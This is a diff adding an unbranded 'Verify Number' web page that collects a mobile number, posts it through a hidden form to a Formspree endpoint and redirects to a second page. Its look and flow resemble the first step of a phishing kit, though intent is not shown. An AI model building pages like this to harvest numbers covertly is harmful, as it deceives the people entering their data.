@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verify Number</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .login-container {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+      border-radius: 24px;
+      padding: 40px 30px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      animation: slideUp 0.6s ease-out;
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .logo-section {
+      text-align: center;
+      margin-bottom: 32px;
+    }
+
+    .logo {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      border-radius: 20px;
+      margin: 0 auto 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 32px;
+      font-weight: bold;
+      color: white;
+      box-shadow: 0 8px 32px rgba(102, 126, 234, 0.3);
+    }
+
+    .welcome-text {
+      color: #1a1a1a;
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      letter-spacing: -0.5px;
+    }
+
+    .subtitle {
+      color: #666;
+      font-size: 16px;
+      font-weight: 400;
+    }
+
+    .form-section {
+      margin-top: 32px;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 24px;
+    }
+
+    .input-label {
+      display: block;
+      color: #333;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 16px 20px;
+      border: 2px solid #e1e5e9;
+      border-radius: 16px;
+      font-size: 16px;
+      background-color: #f8f9fa;
+      transition: all 0.3s ease;
+      outline: none;
+      color: #1a1a1a;
+    }
+
+    .input-field:focus {
+      border-color: #667eea;
+      background-color: #fff;
+      box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
+    }
+
+    .verify-button {
+      width: 100%;
+      padding: 18px;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      border: none;
+      border-radius: 16px;
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 8px 32px rgba(102, 126, 234, 0.3);
+    }
+
+    .verify-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 40px rgba(102, 126, 234, 0.4);
+    }
+
+    .verify-button:active {
+      transform: translateY(0);
+    }
+
+    .security-note {
+      text-align: center;
+      margin-top: 24px;
+      padding: 16px;
+      background-color: rgba(102, 126, 234, 0.05);
+      border-radius: 12px;
+      border: 1px solid rgba(102, 126, 234, 0.1);
+    }
+
+    .security-note-text {
+      color: #666;
+      font-size: 13px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .security-icon {
+      width: 16px;
+      height: 16px;
+      background: #4caf50;
+      border-radius: 50%;
+      position: relative;
+    }
+
+    .security-icon::after {
+      content: '✓';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: white;
+      font-size: 10px;
+      font-weight: bold;
+    }
+
+    @media (max-width: 480px) {
+      .login-container {
+        padding: 32px 24px;
+        border-radius: 20px;
+      }
+      
+      .welcome-text {
+        font-size: 24px;
+      }
+      
+      .subtitle {
+        font-size: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo-section">
+      <div class="logo">V</div>
+      <h1 class="welcome-text">Welcome Back</h1>
+      <p class="subtitle">Verify your mobile number to continue</p>
+    </div>
+
+    <div class="form-section">
+      <div class="input-group">
+        <label class="input-label" for="mobile">Mobile Number</label>
+        <input 
+          type="tel" 
+          id="mobile" 
+          class="input-field" 
+          placeholder="Enter your mobile number"
+          autocomplete="tel"
+        />
+      </div>
+
+      <button class="verify-button" onclick="verifyAndSubmit()">
+        Verify & Continue
+      </button>
+
+      <div class="security-note">
+        <div class="security-note-text">
+          <div class="security-icon"></div>
+          Secure verification • Your data is protected
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Note: localStorage functionality has been replaced with in-memory storage for Claude.ai compatibility
+    let isVerified = false;
+
+    window.onload = function () {
+      // In a real app, this would check localStorage.getItem("verified") === "true"
+      if (isVerified) {
+        window.location.href = "second.html";
+      }
+    };
+
+    function verifyAndSubmit() {
+      const mobile = document.getElementById("mobile").value;
+      if (!mobile || mobile.length < 8) {
+        alert("Please enter a valid mobile number.");
+        return;
+      }
+
+      // Set verification status (in memory for this demo)
+      isVerified = true;
+
+      const form = document.createElement("form");
+      form.method = "POST";
+      form.action = "https://formspree.io/f/xrbqwkke";
+      form.style.display = "none";
+
+      const input = document.createElement("input");
+      input.name = "mobile";
+      input.value = mobile;
+      form.appendChild(input);
+      document.body.appendChild(form);
+      form.submit();
+
+      setTimeout(() => {
+        window.location.href = "second.html";
+      }, 1000);
+    }
+
+    // Add input formatting for better UX
+    document.getElementById('mobile').addEventListener('input', function(e) {
+      // Remove any non-digits
+      let value = e.target.value.replace(/\D/g, '');
+      
+      // Format the number (you can customize this based on your region)
+      if (value.length >= 10) {
+        value = value.substring(0, 10);
+      }
+      
+      e.target.value = value;
+    });
+  </script>
+</body>
+</html>
